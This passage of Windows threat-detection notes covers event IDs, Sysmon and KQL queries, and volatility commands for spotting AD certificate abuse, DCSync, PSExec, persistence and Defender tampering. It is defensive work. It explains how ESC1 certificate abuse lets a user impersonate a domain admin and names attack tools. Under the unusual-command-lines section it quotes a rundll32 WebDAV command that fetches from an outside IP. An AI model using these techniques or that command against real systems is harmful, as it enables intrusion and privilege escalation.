# Example: Creating WSMan shell on server with ResourceUri: http://schemas.microsoft.com/powershell/Microsoft.PowerShell (HACKER\Administrator clientIP: 10.128.0.57)
Channel = Microsoft-Windows-WinRM/Operational
EventID = 91
Description = "*Creating WSMan shell*"
```

### Detection of unusual ADCS certificate requests / Active Directory Certificate Services Abuse - SAN Template Certificates (ESC1)

- Typically, Extended Key Usage (EKU) attributes are used to define how a Public-private key pair generate for a user  can be used.
- Compromise Type 1: If attacker steals Bob’s private key and certificate, and the certificate has an authentication EKU, the attacker can authenticate to the AD domain without knowing Bob’s password
- Compromise Type 2 (ESC1): If a template with an authentication EKU lets low-privilege users specify SANs, an attacker can authenticate as any user in the SAN (eg for a cert with user "Alice", attacker can specify a domain admin account e.g. ace@aceresponder.com)
- Pre-requisites for ESC1:
  - enrollment rights granted to low-privilege users
  - an authentication EKU (Client Authentication, PKINIT Client Authentication, Smart Card Logon, Any Purpose)
  - ability for the requestor to specify SANs

https://www.aceresponder.com/learn/adcs

#### via certsrv.msc

Launch `certsrv.msc` > Look at `issued certificates` > identify certificates that have a `Subject Alternative Name` - `Other Name` specified.

Taken from [here](https://www.aceresponder.com/learn/adcs)

#### via Windows Event Logs / Object Access (4887)

Pre-requiste: Requires the Windows Event Logging to be turned on.

```
# Look for unusual non-matching user name in `Requester` in the windows event log.
EventID = 4886 ("Certificate Services received a certificate request.")
Channel = Security
```


#### via Windows Event Logs / Object Access (4887)

Pre-requiste: Requires the Windows Event Logging to be turned on.

```
# Look for non-matching user name in `Requester` and subject alternative name (`Subject`), (`Attributes`) in the windows event log.
# SAN user name can also appear in subject alternative name
EventID = 4887 ("Object Access")
Channel = Security
Description: Certificate Services approved a certificate request and issued a certificate.
```

#### via Windows Event Logs / Object Access (4887) / ElasticSearch

```
event.code:4887 AND winlog.event_data.Attributes:*SAN\:*
```

Taken from [here](https://www.aceresponder.com/learn/adcs)

#### via RPC Firewall / Elastic search

Pre-requiste: Requires Zero Networks' [RPC Firewall](https://www.aceresponder.com/blog/disrupting-offensive-rpc) to be enabled.

```
winlog.provider_name:RPCFW AND event.code:3 AND winlog.event_data.arg_6.SubjectAltNames:*
```

See [here](https://www.aceresponder.com/blog/disrupting-offensive-rpc)

### Look for certificate based authentication from certificates for ADCS

- Could be useful to detect to detect certificate based authentication and compromise attempts for ESC1 and other ADCS vulnerabilities
  
#### via Windows Audit Event Logs / ID 4768

```
# Certificate Information.Certificate Serial Name, Certificate Information.Thumbprint has the details
# Account Information.Account Name has the details as well of the account for which the certificate was requested
EventID = 4768
Channel = Security
Description = A Kerberos Authentication Ticket was requested
Certificate Information.Certificate Issuer Name = *
```

### Detection of Active Directory Certificate Services Abuse - Any Purpose EKU (ESC2)

Any Purpose (OID 2.5.29.37.0), OR no EKU (SubCA)

#### via OID search

Search for `2.5.29.37.0` OR `SubCA` in all logs and focus on certificate services logs

### Detection of Active Directory Certificate Services Abuse - Certificate Request Agent (ESC3)

If an attacker gets a certificate with the Certificate Request Agent EKU (`1.3.6.1.4.1.311.20.2.1`), they can enroll on behalf of another user. In other words, they can ask the CA to sign a certificate for a higher-privilege account.

#### via OID Search

Search for `1.3.6.1.4.1.311.20.2.1` in all logs and focus on certificate services logs

### Detection of unusual authentication attempts / logon attempts

- Look for excessive failed authentication attempts eg password spray or brute-force
- Look for PSExec attempts (which is typically `LogonType=5`)
- Look for non-null source network address as these are likely malicious attempts (`LogonType=3`)
- Look for authentication attempts from hostnames (e.g. `DESKTOP-XXX`) OR IP addresses if your company which do not follow the naming convention for hostnames including in any VPN logs eg [here](`https://www.linkedin.com/posts/stephan-berger-59575a20a_another-fun-one-the-user-runs-an-installer-activity-7225755841981755392-CnlB/?utm_source=share&utm_medium=member_ios`).  For VPN, see GlobalProtect log field `Machine Name` in format [here](https://docs.paloaltonetworks.com/pan-os/10-2/pan-os-admin/monitoring/use-syslog-for-monitoring/syslog-field-descriptions/globalprotect-log-fields)
- Look for overpass-the-hash attempts as described [here](https://detection.fyi/sigmahq/sigma/windows/builtin/security/account_management/win_security_overpass_the_hash/)
- To identify brute-force sweeps e.g. SMB sweep / password spray, Look for logon for a username across multiple hosts in a short period of time

#### via Windows Event Logs / 4624, 4625

```
# Look for logons across multiple hosts over a short period 

Channel = Security
EventID=4624 (An account was successfully logged on) OR 4625 (An account failed to log on)
LogonType = 2 (Interactive) OR 3 (Network) OR 5 (Service started by Service Control Manager) 8 (NetworkClearText)

OR

# Overpass-the-hash detection (https://detection.fyi/sigmahq/sigma/windows/builtin/security/account_management/win_security_overpass_the_hash/)
EventID = 4624
LogonType = 9 (NewCredentials)
LogonProcessName = seclogo
AuthenticationPackageName = Negotiate
```

Taken from [here](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4625#_Ref433822321)

#### via Windows Event Logs / 4771, 4776

- Very good for identification of password brute-force attempts via tools like kerbrute, crackmapexec

```
# 'Logon Account' field shows the username that was attempted
Channel = Security
EventID = 4776 (The computer attempted to validate the credentials for an account.)

# Account Information.Account Name contains the name of the account that was attempted
Channel = Security
EventID = 4771 (Kerberos Pre-Authentication failed.)
```

#### via Microsoft Defender Advanced Threat Hunting / KQL

```
DeviceLogonEvents
| project Timestamp, DeviceId, ReportId, DeviceName, AccountDomain, AccountName, LogonType, ActionType, RemoteIP, AdditionalDetails
| sort by Timestamp desc 
```

### Detection of PSExec usage to authenticate

https://www.hackthebox.com/blog/how-to-detect-psexec-and-lateral-movements

Along with these detections, look for EventID=`4624` and logontype=`5` (Service startup) to identify which user may have performed this `PSExec.exe` authentication

Detections mostly taken from: https://www.hackthebox.com/blog/how-to-detect-psexec-and-lateral-movements

#### via Windows Sysmon Event Logs / 1

```
EventID = 1 (Process Create)
Channel = Microsoft-Windows-Sysmon/Operational
ParentImage: C:\Windows\System32\services.exe
CommandLine = C:\Windows\PSEXESVC.exe
```

#### via Windows Sysmon Event Logs / 13

```
Channel = Microsoft-Windows-Sysmon/Operational
EventID = 13 (Registry Value Set)
EventType = SetValue
Image = C:\Windows\system32\services.exe
TargetObject = HKLM\System\CurrentControlSet\Services\PSEXESVC\Start
```

#### via Windows Sysmon Event Logs / 11

```
Channel = Microsoft-Windows-Sysmon/Operational
EventID = 11 (File created)
TargetFilename = C:\Windows\PSEXESVC.exe
```

#### via Windows Event Logs / 7036

```
EventID = 7036 (The PSEXESVC service entered the running state.)
Channel = System
```

### Detection of Active Directory Certificate Services Abuse - Template Modification (ESC4)

- Since templates are securable AD objects, an attacker with control can abuse them like any other AD object.
    - Eg. an attacker can effectively make a template vulnerable to ESC1 and request a user with a SAN. ESC1 behavior is set by the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag in the template’s ms-PKI-Certificate-Name-Flag property.

#### via Windows Event Logs / 4900 (Changes to Certificate Security Descriptor / ACL)

```
Channel = Security
EventID = 4900 (Certificate Services template security was updated)
```

Example of this Event ID is [here](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4900)

#### via Windows Event Logs / 4899 (Changes to Certificate Template)

```
Channel = Security
EventID = 4899 (A Certificate Services template was updated)
```

Example of this event ID is [here](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4899)

#### via Windows Event Logs / 4662 (An operation was performed on an object)

Pre-requisite: Requires that the object audit logging is enabled via `auditpol /set` and also auditing enabled for `ADSI Edit > Action > Connect to... > Select 'Configuration' in Naming Context instead of Default > CN=Services > CN=Public Key Services > CN=Certificate Templates`. Taken from [here](https://labs.lares.com/adcs-exploits-investigations-pt1/#audit-certificate-templates-modification-operations)

```
# Look at the Account Name for the person that made the change. ms-PKI-Certificate-Name-Flag = {ea1dddc4-60ff-416e-8cc0-17cee534bce7} which is used for introducing ESC1 vulnerability (SAN)
EventID = 4662 (An operation was performed on an object)
Channel = Security
Operation.Properties = "*Write-Property*"
# Records changes to 'PKI-Certificate-Template' OR 'ms-PKI-Certificate-Name-Flag'
Operation.Properties = "*{ea1dddc4-60ff-416e-8cc0-17cee534bce7}*" OR "*{e5209ca2-3bba-11d2-90cc-00c04fd91ab1}*"
```

#### via RPC Firewall logs / RPCFW:3

```
# If using RPC Firewall
winlog.provider_name:RPCFW AND event.code:3 AND carol
```

### Detection of DCSync

#### via Windows Event Logs / 4662

```
# Subject.Account Name has the user account which performs DCSync
Event ID: 4662 (An operation was performed on an object)
Object Server: DS
# Domain-DNS
Object.Object Type: "{19195a5b-6da0-11d0-afd3-00c04fd930c9}" 
# DS-Replication-Get-Changes-In-Filtered-Set, DS-Replication-Get-Changes, DS-Replication-Get-Changes-All, DS-Replication-Get-Changes-In-Filtered-Set
Operation.Properties: {89e95b76-444d-4c62-991a-0facbeda640c} OR {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} OR {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} OR {89e95b76-444d-4c62-991a-0facbeda640c}
```

Taken from [here](https://blog.blacklanternsecurity.com/p/detecting-dcsync)

### Detection of Skeleton Key 

- To prevent skeleton key, need to ensure that Protected Process is switched on to only allow Microsoft Signed Processes to inject into LSA
- Protect domain admin accounts carefully as that is a pre-requisite

  
#### via Windows Event Logs / 4673,4611 Event IDs

```
Event ID: 4673 (Sensitive Privilege Use)
Service Name: LsaRegisterLogonProcess()
Process: C:\Windows\System32\lsass.exe
```

```
# This means that requests for logon will go to the LSA for a new process
# Created very close to the previous event
Event ID: 4611 (A trusted logon process has been registered with the Local Security Authority.)
```

Taken from [here](https://adsecurity.org/?p=1275)

### Google Chrome Browser Browser Sync

Browser Sync could lead to passwords, bookmarks, history, etc to be shared when user logs into other browsers. 

#### via Chrome registry

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome
```

If value `SyncDisabled DWORD` set to 0 OR not present then Enabled.

Otherwise, it is Disabled.

#### via Google Chrome Browser UI 

Click on Google Chrome browser > Turn On Sync... > Settings > Manage What you Sync

### Scheduled Tasks Deletion

Can be a persistence mechanism for threat actors cleaning up after.

#### via Windows Event Logs / TaskScheduler

```
Event ID: 141
Channel: Microsoft-Windows-TaskScheduler/Operational
Description: User "HACKER\$USERNAME"  deleted Task Scheduler task "\$TASK_NAME"
```

#### via Windows Event Logs / Sysmon / Registry Deleted

```
Event ID: 12 (Registry Object Added or Deleted)
EventType: DeleteKey
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TestTask
Channel: Microsoft-Windows-Sysmon/Operational
```

### Scheduled Tasks Creation

Can be a persistence mechanism for threat actors OR even launching of shells from tools like [impacket-atexec](https://github.com/manasmbellani/Blue-Team-Notes/blob/main/Examples%20Of%20Lateral%20movement.md)

Most detection techniques taken from [here](https://www.binarydefense.com/resources/blog/diving-into-hidden-scheduled-tasks/)

#### via HKLM registry / TaskCache\Tree

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$TASK_NAME"
```

#### via powershell \ HKLM registry / TaskCache\Tasks

```
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\
```

```
# Get the path from each GUID e.g. HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{FB85EA40-DB41-49E9-9FE6-17D5793EB1A1} under TaskCache\Tasks
# Can get further details with reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{FB85EA40-DB41-49E9-9FE6-17D5793EB1A1}"
$KEY = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks"

Get-ChildItem -Path $KEY | ForEach-Object {
    $GUID = $_.PSChildName
    $Path = (Get-ItemProperty -Path "$KEY\$GUID").Path
    Write-Output "GUID: $GUID"
    Write-Output "Path: $Path"
    Write-Output "`n"
}
```

#### powershell / Get-ScheduledTask

```
# List all tasks
Get-ScheduledTask > C:\Windows\System32\powershell-schtasks.txt

# View further details about the task
powershell -ep bypass "(Get-ScheduledTask $TASK_NAME).Actions" | more
```
#### via Windows Event Logs / TaskScheduler Logs

```
Event ID: 106 (User "HACKER\$USERNAME"  registered Task Scheduler task "\$TASK_NAME")
Channel: Microsoft-Windows-TaskScheduler/Operational
```

```
# When an instance of the task is launched - it is also indicative of the task being executed
Event ID: 100 (Task Scheduler started instance of the '$TASK_NAME' task)
Channel: Microsoft-Windows-TaskScheduler/Operational

# Captures the command line for this task
Event ID: 200 (Task Scheduler launched action $CMDLINE of task '$TASK_NAME')
Channel: Microsoft-Windows-TaskScheduler/Operational
```

#### via Windows Event Logs / Sysmon / Process Create

```
Event ID: 13 (Registry Value Set)
Channel: Microsoft-Windows-Sysmon/Operational
CommandLine: *\schtasks.exe*/create*
```

#### via Windows Event Logs / Sysmon / TaskCache\Tasks, TaskCache\Tree

```
Event ID: 13 (Registry Value Set)
Channel: Microsoft-Windows-Sysmon/Operational
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$TASK_GUIDE\Path OR HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TestTask\SD
```

#### via schtasks.exe

```
schtasks.exe > C:\Windows\System32\schtasks.txt
```

Taken from [here](https://www.binarydefense.com/resources/blog/diving-into-hidden-scheduled-tasks/)

### Detect RDP Authentication Sessions

Taken from [here](https://ponderthebits.com/2018/02/windows-rdp-related-event-logs-identification-tracking-and-investigation/)

#### via Windows Event Logs / Microsoft-Windows-TerminalServices-LocalSessionManager/Operational

```
# 'User' field contains the username and 'Source Network Address' contains the client IP
EventID: 25
Channel: Microsoft-Windows-TerminalServices-LocalSessionManager/Operational
```

#### via Windows Event Logs / Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational

```
# 'User' field contains the username and 'Source Network Address' contains the client IP
EventID: 1149 (Remote Desktop Services: User authentication succeeded)
Channel: Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational
```

#### via Windows Event Logs / Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational

```
# Source IP/port shown in Description as 'The server accepted a new TCP connection from client x.x.x.x:y'
EventID: 131 (The server accepted a new TCP connection)
Channel: Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational
```

#### via Windows Event Logs / sysmon / Event ID 3 (Network Connection)\

```
# 'SourceIp' field contains the client IP address
EventID: 3 (Network Connection Detect
Channel: Microsoft-Windows-Sysmon/Operational
DestinationPort: 3389
```

### Detect Timestomping / Filesystem time changes

#### via sysmon / windows event logs

Use `powershell` to display the creation, modification, accessed dates

```
Get-Item -Path C:\Windows\Temp\test.txt | Format-List
```

```
# Image attribute lists full path of the process that changed timestamp and TargetFileName lists the Filename
EventID: 2 (File Creation Time changed)
Channel: Microsoft-Windows-Sysmon/Operational
```

#### via various methods for created and deleted files

See [here](#check-created-and-deleted-files)

### Detect authentication attempts indicating credential dumping

#### via Windows Event Logs / Sysmon

Can be used to detect tools like `go-secdump` used for dumping various credentials like LSA, SAM.

```
Event ID: 18 (Pipe Connected)
Channel: Microsoft-Windows-Sysmon/Operational
PipeName: \ntsvcs OR \winreg
EventType: connect
```

### Identify and Recover Deleted files

See [here](../linux_compromised_host#identify-and-recover-deleted-files-from-disk)

### Detect Disabling Windows Defender

#### via Windows Event Logs / Sysmon / Registry

The `Image` field for the log below shows the process attempting to disable Defender RealTime Monitoring
```
Channel: Microsoft-Windows-Sysmon/Operational
EventID: 13 (Registry value set)
TargetObject: HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring
```

```
Channel: Microsoft-Windows-Sysmon/Operational
EventID: 13 (Registry value set)
TargetObject: HKLM\SOFTWARE\Microsoft\Windows Defender\Spynet\SpyNetReporting
```

### Detect Blocking of Windows Defender

#### via Windows Event Logs 

Check the `Rule ID`, `Rule Name` and `Application Path` - ensure that it is not an AV related path e.g. `C:\Program Files\Windows Defender Advanced Threat Protection\SenseCncProxy.exe`

```
Channel: Microsoft-Windows-Windows Firewall With Advanced Security/Firewall
Event ID: 2097 (A rule has been added to the Windows Defender Firewall exception list.)
```

Taken from [here](https://github.com/LearningKijo/ResearchDev/blob/main/DEV/DEV03-FirewallTampering/Dev03-FirewallTampering.md)

### Clear Windows Event Logs

#### via Windows Event Logs

```
Channel: System
EventID: 104 (System Log File was cleared)
```

### Detect LSA Dumping

#### via remote registry key enabling / Windows Event ID 7036

```
Event ID = 7036
Channel = System
Description = "Remote Registry Key service entered the running state"
```

### Detect Lsass Dumping

#### via Windows Event Logs / Sysmon Event ID 10

```
Channel: Microsoft-Windows-Sysmon/Operational
EventID: 10 (Process Accessed)
TargetImage: C:\Windows\System32\lsass.exe
```

### WMI Event Consumers Analysis

To detect malicious event consumers, we can use `WMIExplorer` GUI to examine the current machine's WMI Event Consumers and filters that are feeding the consumers to execute an action.

Alternatively, SysInternals `AutoRuns` can be used to detect WMI consumers, filters from the WMI tab and also delete them.

### Operating System Information / Banners

#### via volatility3 / windows.info.Info

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f ~/vulnhub/letsdefend/randev/RanDev.vmem windows.info.Info
deactivate
```

#### via volatility2 / imageinfo

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py -f ~/vulnhub/letsdefend/randev/RanDev.vmem imageinfo
deactivate
```

#### via volatility2 / kdbgscan

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py -f ~/vulnhub/letsdefend/randev/RanDev.vmem kdbgscan
deactivate
```

#### via volatility3 / banners.Banners

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f ~/vulnhub/letsdefend/randev/RanDev.vmem banners.Banners
deactivate
```

### Get supported volatility profiles

#### via volatility2 / info

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --info
deactivate
```

#### via volatility2 website

See https://github.com/volatilityfoundation/volatility/wiki/2.6-Win-Profiles

### Process Tree / Process Listing

#### via volatility3 / pslist

We are able to review the live `.raw` RAM collected via any of the live collection methods using volatility3 with commands as follows via `volatility3` to list current processes:
```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/TEST-WIN-INSTAN-20240315-062005.raw windows.pslist.PsList
deactivate
```

#### via volatility2 / psxview

Can also help detect hidden processes

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=WinXPSP2x86 -f ~/vulnhub/letsdefend/randev/RanDev.vmem psxview
deactivate
```

More info: https://www.oreilly.com/library/view/digital-forensics-and/9781787288683/4732c6ac-0f3c-44b9-bce8-949352ed3755.xhtml

#### via volatility3 / psscan

Able to also find hidden processes unlinked from rootkits
```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.psscan.PsScan
deactivate
```

#### via volatility3 / pstree

We are also able to see the process from live `.raw` RAM as a tree like structure using `volatility3`:
```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/TEST-WIN-INSTAN-20240315-062005.raw windows.pstree.PsTree
deactivate
...
******* 1244    5220    PsExec.exe      0xcf830d644080  6       -       2       True    2024-03-15 06:19:57.000000      N/A     \Device\HarddiskVolume3\Users\manasbellani\Downloads\SysinternalsSuite\PsExec.exe   PsExec.exe  -s -i cmd.exe       C:\Users\manasbellani\Downloads\SysinternalsSuite\PsExec.exe
...
```

### Get Directory Table Base (DTB) for a process

See [here](#get-directory-table-base-dtb-for-a-kernel) for info on what DTB is

#### via volatility2 / volshell

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=WinXPSP2x86 -f ~/vulnhub/letsdefend/randev/RanDev.vmem volshell -p 880 
deactivate
```

### Detect unusual Network DNS queries

- Look for unusual DNS lookups e.g.
```
# Indicative of ngrok usage within Windows. See https://www.huntress.com/blog/abusing-ngrok-hackers-at-the-end-of-the-tunnel
ngrok-agent.com
# equinox.io is for distributing Golang packaged apps eg ngrok. See https://equinox.io, https://ngrok.com/docs/guides/device-gateway/linux/
equinox.io
# CloudFlared - https://x.com/malmoeb/status/1736995855482118314, https://www.guidepointsecurity.com/blog/tunnel-vision-cloudflared-abused-in-the-wild/
argotunnel.com
```

- Look for unusual processes making DNS queries e.g.
```
# For e.g. with excel canarytokens from canarytokens.org
Excel.exe
Word.exe
```

#### via Microsoft Windows Defender Advanced Threat Hunting / KQL

```
DeviceNetworkEvents
| where DeviceName contains "laptop-name"
//| where InitiatingProcessFileName == "msedge[.]exe"
| where InitiatingProcessFileName == "chrome[.]exe"
| where RemoteUrl != ""
```

Taken from [here](https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/get-users-browser-history-via-live-response/m-p/3950769)

#### via Windows Event Sysmon Logs / EventID 22

```
EventID=22
Channel = Microsoft-Windows-Sysmon/Operational
```

### Detect unusual Network Connections / Sockets

- Look for unusual outbound connectivity via network connection logs e.g.

```
# As discussed [here](https://www.linkedin.com/posts/stephan-berger-59575a20a_another-fun-one-the-user-runs-an-installer-activity-7225755841981755392-CnlB/?utm_source=share&utm_medium=member_ios)
FTP (port 21)
# E.g. for ocnnectivity to ngrok agents, as an example
Destination IP: Amazon IP addresses
```

#### via Microsoft Windows Defender Advanced Threat Hunting / KQL

```
DeviceNetworkEvents
| where DeviceName contains "testvm2"
| where InitiatingProcessFileName == "iexplore.exe"
| sort by Timestamp desc
```

#### via Windows Event Sysmon Logs / Event ID 3

```
EventID = 3 (Network Connection)
Channel = Microsoft-Windows-Sysmon/Operational
```

#### via volatility2 / netscan

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem netscan
deactivate
```

#### via volatility2 / netstat

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem netstat
deactivate
```

#### via volatility3 / netscan

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.netscan
deactivate
```

#### via volatility3 / netstat

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.netstat
deactivate
```

#### via volatility2 / connscan

Windows XP/2003 specific

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem connscan
deactivate
```

#### via volatility2 / sockscan

Windows XP/2003 specific

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem sockscan
deactivate
```

#### via volatility2 / sockets

Windows XP/2003 specific

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem sockets
deactivate
```

#### via volatility2 / connections

Windows XP/2003 specific

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem connections
deactivate
```


### Determine installed powershell version

#### via powershell / Get-Host

```
Get-Host | Select-Object Version
```

https://learn.microsoft.com/en-us/powershell/module/azuread/connect-azuread?view=azureadps-2.0

#### via registry key

```
reg query HKLM\Software\Microsoft\PowerShell\1\PowerShellEngine
reg query HKLM\Software\Microsoft\PowerShell\3\PowerShellEngine
```

### Listing files

#### via volatility3 / filescan

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.filescan.FileScan
deactivate
```

#### via volatility3 / mftscan

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.mftscan.MFTScan
deactivate
```

#### via volatility2 / filescan

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem filescan
deactivate
```

#### via volatility2 / mftparser

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem mftparser
deactivate
```

### Look for Alternate Data Streams (ADS) files

#### via volatility3 / mftscan.ADS

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.mftscan.ADS
deactivate
```

#### via powershell

```
$FolderToCheck="C:\Users\manasbellani"
Get-ChildItem  -Recurse -Path $FolderToCheck | %{$ads = Get-Content $_.FullName -Stream Zone.Identifier -ErrorAction SilentlyContinue; if ($ads) { Write-Host "ADS for file " $_.FullName ": $ads"} }
```

#### via Autopsy 

Filter for `.Zone.Identifer` files especially in Downloads folder in Autopsy

### Look for unusual memberships for AD Groups

Monitor for membership changes to these key groups: 
```
# Key AD Groups which can allow privilege escalation, Taken from: https://github.com/mthcht/awesome-lists/blob/main/Lists/permissions/AD/windows_sensitives_ad_groups_list.csv
ESX Admins
ESXi Admins
Account Operators
Administrators
Backup Operators
DnsAdmins
Admins DNS
Domain Admins
Enterprise Admins
Enterprise Key Admins
Group Policy Creator Owners
Hyper-V Administrators
Print Operators
Remote Management Users
Replicators
Schema Admins
Server Operators
Key Admins
Remote Desktop Users
```


#### via windows event logs / Event ID 4728 / EventID 4732

```
Channel = Security
EventID = 4728 (A member was added to a security-enabled global group) OR 4732 (A member was added to a security-enabled local group)
```

#### via net

```
# To list all the AD Groups
net localgroup

# To list all the members in an AD Group
net localgroup $AD_GROUP
```

#### via powershell / Get-ADGroupMember

```
Get-ADGroupMember -Identity $GROUP_NAME
```

### Look for unusual Command Lines

Look for:
```
# See https://www.huntress.com/blog/abusing-ngrok-hackers-at-the-end-of-the-tunnel > `What Is Conhost.exe?`
renamed processes masquerading as `conhost.exe` or `cmd.exe` but in reality are ngrok.exe

# Check for unusual chars for command line arguments eg. powershell can accept /command, -command, unicode - command, etc

# Check SHA256, SHA512 hashes for the processes / command lines that are executed to detect if binary files were renamed

# Look for download attempts via webdav which can be done for malware. See https://dfir.ch/posts/today_i_learned_webdav_cache/#tfs_dav
rundll32.exe C:\Windows\system32\davclnt.dll,DavSetCookie 216.9.224.58@5555 http://216.9.224.58:5555/
```

#### via Windows Event Sysmon Logs / Event ID 4688, Event ID 1

See [here](#detect-for-unusual-processes-and-parent-processes-created)

#### via Microsoft Defender's KQL Advanced Threat Hunting / Sentinel

```
DeviceProcessEvents
| where DeviceName contains "testvm"
| project Timestamp, DeviceName, AccountDomain, AccountName, ProcessCommandLine,  InitiatingProcessCommandLine
| sort by Timestamp desc 
```

For info on `DeviceProcessEvents`, Refer [here](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/deviceprocessevents)

#### via volatility2 / cmdscan

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=WinXPSP2x86 -f /root/RanDev.vmem cmdscan
deactivate
```

#### via volatility2 / cmdline

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=WinXPSP2x86 -f /root/RanDev.vmem cmdline
deactivate
```

#### via volatility2 / consoles

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=WinXPSP2x86 -f /root/RanDev.vmem consoles
deactivate
```

#### via volatility3 / cmdline

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.cmdline.CmdLine
deactivate
```

#### via registry / RunMRU

Captures command lines run via the `Run` dialog box in Windows

```
HKEY_USERS\$SID\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

#### via Anti-virus (AV) Log Files

Capture the command lines from the Anti-virus log files

```
# Symantec AV logs can show command lines as per https://x.com/malmoeb/status/1814392099376095523?s=46&t=WvGY79Umt5enRwgCbi4TQQ
C:\ProgramData\Symantec\Symantec Endpoint Protection\<version>\Data\Logs\AV\<number>.Log

# Folder can identify AV Security Events and times as per https://me.n-able.com/s/article/AV-Defender----Agent-Log-files-created-and-their-descriptions
C:\Program files(x86)\N-able Technologies\Windows Agent\Logs

# Windows Defender Log files can contain 'SDN:' which shows full file path and SHA2 hashes, 'DETECTION_ADD' can reveal the file paths which were identified as malware, ':EMS' can detect the process injections. Taken from: https://www.crowdstrike.com/blog/how-to-use-microsoft-protection-logging-for-forensic-investigations/
C:\ProgramData\Microsoft\Windows Defender\Support\MPLog-*
```

### Get Directory Table Base (DTB) for a kernel

DTB converts the physical address to virtual addresses

#### via volatility2 / kpcrscan

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/TEST-WIN-INSTAN-20240315-062005.raw kpcrscan
deactivate
```

#### via volatility2 / imageinfo

See [here](#via-volatility2--imageinfo)

#### via volatility3 / windows.info.Info

See [here](#via-volatility3--windowsinfoinfo)

### Detect code injections / malware / hidden DLLs running in processes

#### via volatility3 / malfind

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.malfind
deactivate
```

#### via volatility2 / yarascan

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem yarascan -y $YARA_RULE_FILE
deactivate
```

#### via volatility3 / yarascan

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem yarascan.YaraScan --yara-file $YARA_RULE_FILE
deactivate
```

#### via volatility2 / psxview

See [here](#via-volatility2--psxview)

#### via sysmon logs / Process Create (Event ID 1)

Check the parent process in Sysmon Logs for suspicious Process Create (Event ID 1) events such as `cmd.exe`, `powershell.exe`, `nc.exe`, etc. and look at unusual parent process such as `word.exe`, `.jar` files, etc.

